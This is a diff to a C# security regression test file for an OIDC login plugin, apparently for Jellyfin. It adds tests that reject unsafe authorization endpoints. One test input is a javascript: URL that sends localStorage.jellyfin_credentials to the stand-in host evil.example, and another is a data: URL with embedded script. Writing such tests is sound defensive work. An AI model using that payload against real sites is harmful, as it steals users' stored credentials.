@@ -168,7 +168,46 @@ public sealed class SecurityRegressionTests
         Assert.DoesNotContain("attacker.example", requests);
     }
 
-    private const string GoogleDocument = """{"issuer":"https://accounts.google.com","authorization_endpoint":"https://accounts.google.com/o/oauth2/v2/auth","device_authorization_endpoint":"https://oauth2.googleapis.com/device/code","token_endpoint":"https://oauth2.googleapis.com/token","userinfo_endpoint":"https://openidconnect.googleapis.com/v1/userinfo","revocation_endpoint":"https://oauth2.googleapis.com/revoke","jwks_uri":"https://www.googleapis.com/oauth2/v3/certs"}""";
+    [Theory]
+    [InlineData("javascript:fetch('//evil.example/'+localStorage.jellyfin_credentials)//")]
+    [InlineData("data:text/html,<script>alert(1)</script>")]
+    [InlineData("//evil.example/authorize")]
+    [InlineData("/authorize")]
+    [InlineData("https://user:pass@idp.example/authorize")]
+    [InlineData("https://idp.example/authorize#fragment")]
+    public async Task An_authorization_endpoint_a_browser_should_not_be_sent_to_is_refused(string endpoint)
+    {
+        // #339: the link page navigates to it from script, on Jellyfin's own origin.
+        using var factory = new OidcClientFactory(NullLogger<OidcClientFactory>.Instance);
+        var document = System.Text.Json.JsonSerializer.Serialize(new Dictionary<string, string>
+        {
+            ["issuer"] = "https://idp.example",
+            ["jwks_uri"] = "https://idp.example/keys",
+            ["token_endpoint"] = "https://idp.example/token",
+            ["authorization_endpoint"] = endpoint,
+        });
+        using var client = new HttpClient(new Handler(request =>
+        {
+            var json = request.RequestUri!.AbsolutePath.EndsWith("openid-configuration", StringComparison.Ordinal)
+                ? document
+                : """{"keys":[]}""";
+            return Task.FromResult(new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(json) });
+        }));
+        typeof(OidcClientFactory).GetField("_http", BindingFlags.NonPublic | BindingFlags.Instance)!.SetValue(factory, client);
+
+        await Assert.ThrowsAsync<InvalidOperationException>(() =>
+            factory.GetDiscoveryDocumentAsync(new ProviderConfig { Id = "p", Authority = "https://idp.example" }));
+        Assert.Throws<InvalidOperationException>(() => OidcClientFactory.NavigableAuthorizeEndpoint(endpoint));
+    }
+
+    [Theory]
+    [InlineData("https://login.example/authorize")]
+    [InlineData("http://idp.lan:9000/application/o/authorize/")]
+    [InlineData("https://accounts.google.com/o/oauth2/v2/auth")]
+    public void An_ordinary_authorization_endpoint_on_any_host_is_accepted(string endpoint)
+        => Assert.Equal(new Uri(endpoint), OidcClientFactory.NavigableAuthorizeEndpoint(endpoint));
+
+    private const string GoogleDocument ="""{"issuer":"https://accounts.google.com","authorization_endpoint":"https://accounts.google.com/o/oauth2/v2/auth","device_authorization_endpoint":"https://oauth2.googleapis.com/device/code","token_endpoint":"https://oauth2.googleapis.com/token","userinfo_endpoint":"https://openidconnect.googleapis.com/v1/userinfo","revocation_endpoint":"https://oauth2.googleapis.com/revoke","jwks_uri":"https://www.googleapis.com/oauth2/v3/certs"}""";
 
     private const string PlainDocument = """{"issuer":"https://idp.example","jwks_uri":"https://idp.example/keys","token_endpoint":"https://idp.example/token"}""";
 
